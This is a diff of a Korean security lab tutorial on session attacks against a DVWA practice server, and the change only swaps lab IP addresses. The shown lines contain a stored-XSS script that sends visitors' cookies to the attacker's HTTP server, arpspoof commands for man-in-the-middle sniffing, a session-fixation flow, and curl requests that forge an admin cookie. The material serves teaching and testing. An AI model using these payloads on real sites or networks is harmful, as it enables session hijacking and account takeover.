@@ -23,8 +23,8 @@ mermaid: true
 
 | 구분 | 내용 |
 |---|---|
-| 공격자 | Kali Linux (192.168.0.10) |
-| 대상 | Ubuntu + DVWA (192.168.0.30/DVWA/) |
+| 공격자 | Kali Linux (192.168.56.10) |
+| 대상 | Ubuntu + DVWA (192.168.56.30/DVWA/) |
 | 도구 | Burp Suite, tcpdump, python3 |
 
 ---
@@ -167,7 +167,7 @@ flowchart TD
 **1단계: DVWA Weak Session IDs 페이지 접속**
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/weak_id/
+http://192.168.56.30/DVWA/vulnerabilities/weak_id/
 ```
 
 **2단계: "Generate" 버튼을 여러 번 눌러 세션 ID 변화 관찰**
@@ -230,7 +230,7 @@ python3 -m http.server 8000
 **2단계: DVWA > XSS (Stored) 에서 악성 스크립트 게시**
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/xss_s/
+http://192.168.56.30/DVWA/vulnerabilities/xss_s/
 ```
 
 Name 필드 또는 Message 필드에 아래 스크립트를 입력합니다:
@@ -238,7 +238,7 @@ Name 필드 또는 Message 필드에 아래 스크립트를 입력합니다:
 ```javascript
 <script>
 var img = new Image();
-img.src = 'http://192.168.0.10:8000/steal?cookie=' + document.cookie;
+img.src = 'http://192.168.56.10:8000/steal?cookie=' + document.cookie;
 </script>
 ```
 
@@ -251,7 +251,7 @@ img.src = 'http://192.168.0.10:8000/steal?cookie=' + document.cookie;
 Kali의 http.server 로그에 다음과 같이 쿠키가 기록됩니다:
 
 ```
-192.168.0.30 - - [01/Jun/2026] "GET /steal?cookie=PHPSESSID=abcdef123456;%20security=low HTTP/1.1" 200 -
+192.168.56.30 - - [01/Jun/2026] "GET /steal?cookie=PHPSESSID=abcdef123456;%20security=low HTTP/1.1" 200 -
 ```
 
 **4단계: 탈취한 세션 ID로 접속**
@@ -283,7 +283,7 @@ sequenceDiagram
     participant S as 취약한 서버
 
     A->>S: 일반 접속 → 세션 ID 획득 (PHPSESSID=attack123)
-    A->>V: http://192.168.0.30/DVWA/?PHPSESSID=attack123 링크 전달
+    A->>V: http://192.168.56.30/DVWA/?PHPSESSID=attack123 링크 전달
     V->>S: 해당 링크로 접속 후 로그인 시도
     S->>S: 로그인 성공 (세션 ID 변경 없이 attack123 유지)
     A->>S: 동일한 attack123으로 접속 → 인증된 세션 사용
@@ -350,11 +350,11 @@ Cookie: PHPSESSID=abcdef123456; security=low
 
 ```bash
 # 게이트웨이와 피해자 사이에 끼어들기 (arpspoof 사용)
-arpspoof -i eth0 -t 192.168.0.30 192.168.0.1
-arpspoof -i eth0 -t 192.168.0.1 192.168.0.30
+arpspoof -i eth0 -t 192.168.56.30 192.168.56.1
+arpspoof -i eth0 -t 192.168.56.1 192.168.56.30
 ```
 
-이후 tcpdump로 192.168.0.30의 HTTP 트래픽을 수신하면  
+이후 tcpdump로 192.168.56.30의 HTTP 트래픽을 수신하면  
 피해자의 세션 쿠키를 평문으로 확인할 수 있습니다.
 
 > **이 공격은 HTTPS 환경에서는 동작하지 않습니다.** TLS 암호화가 세션 쿠키를 보호합니다.  
@@ -504,11 +504,11 @@ if (!isset($_COOKIE['username'])) {
 
 ```bash
 # Step 1) 발급된 쿠키에 중요 정보(식별자/권한)가 노출되는지
-curl -i -s http://192.168.0.30/cookie_auth.php | grep -i set-cookie
+curl -i -s http://192.168.56.30/cookie_auth.php | grep -i set-cookie
 # → Set-Cookie: username=user
 
 # Step 2) 쿠키 값을 변조해 권한 상승되는지
-curl -s --cookie "username=admin" http://192.168.0.30/cookie_auth.php
+curl -s --cookie "username=admin" http://192.168.56.30/cookie_auth.php
 # → "Welcome, admin — 관리자 권한!" 이면 취약
 ```
 
